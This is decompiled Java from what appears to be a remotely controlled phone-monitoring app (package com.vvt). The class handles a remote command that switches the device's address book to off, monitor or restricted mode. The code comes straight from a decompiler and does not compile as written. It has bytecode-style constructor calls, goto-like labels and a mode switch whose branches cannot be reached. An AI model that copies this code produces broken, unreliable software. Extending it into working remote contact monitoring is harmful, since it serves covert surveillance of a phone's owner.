package com.vvt.remotecommand.processor.b;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.input.RmtCtrlInputAddressBookMode;
import com.vvt.remotecontrol.input.RmtCtrlInputAddressBookMode.Mode;
import java.util.ArrayList;

public class b
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public b(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  private RmtCtrlInputAddressBookMode.Mode a(int paramInt)
  {
    RmtCtrlInputAddressBookMode.Mode localMode = RmtCtrlInputAddressBookMode.Mode.OFF;
    switch (paramInt)
    {
    default: 
      localMode = RmtCtrlInputAddressBookMode.Mode.OFF;
    }
    for (;;)
    {
      return localMode;
      localMode = RmtCtrlInputAddressBookMode.Mode.MONITOR;
      continue;
      localMode = RmtCtrlInputAddressBookMode.Mode.RESTRICTED;
    }
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    int k = -1;
    boolean bool4 = a;
    if (bool4) {}
    int m = ((ArrayList)localObject1).size();
    int j;
    if (m == i)
    {
      m = 0;
      localRemoteFunction = null;
      localObject1 = (String)((ArrayList)localObject1).get(0);
      try
      {
        j = Integer.parseInt((String)localObject1);
      }
      catch (NumberFormatException localNumberFormatException)
      {
        for (;;)
        {
          j = k;
        }
      }
      if ((j == 0) || (j == i)) {
        break label124;
      }
      k = 2;
      if (j == k) {
        break label124;
      }
      localObject1 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject1).<init>();
      throw ((Throwable)localObject1);
    }
    Object localObject2 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
    ((InvalidCommanFormatException)localObject2).<init>();
    throw ((Throwable)localObject2);
    label124:
    localObject2 = a(j);
    boolean bool3 = a;
    if (bool3) {}
    Object localObject3 = new com/vvt/remotecontrol/input/RmtCtrlInputAddressBookMode;
    ((RmtCtrlInputAddressBookMode)localObject3).<init>();
    ((RmtCtrlInputAddressBookMode)localObject3).setMode((RmtCtrlInputAddressBookMode.Mode)localObject2);
    localObject2 = new com/vvt/remotecontrol/ControlCommand;
    ((ControlCommand)localObject2).<init>();
    RemoteFunction localRemoteFunction = RemoteFunction.SET_MODE_ADDRESS_BOOK;
    ((ControlCommand)localObject2).setFunction(localRemoteFunction);
    ((ControlCommand)localObject2).setData(localObject3);
    bool3 = a;
    if (bool3) {}
    localObject3 = h();
    ((com.vvt.remotecontrol.a)localObject3).execute((ControlCommand)localObject2);
    if (paramc != null)
    {
      bool2 = a;
      if (bool2) {}
      localObject2 = "";
      paramc.b(paramRemoteCommand, this, (String)localObject2);
    }
    boolean bool2 = a;
    if (bool2) {}
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcSetAddressBookManagement";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */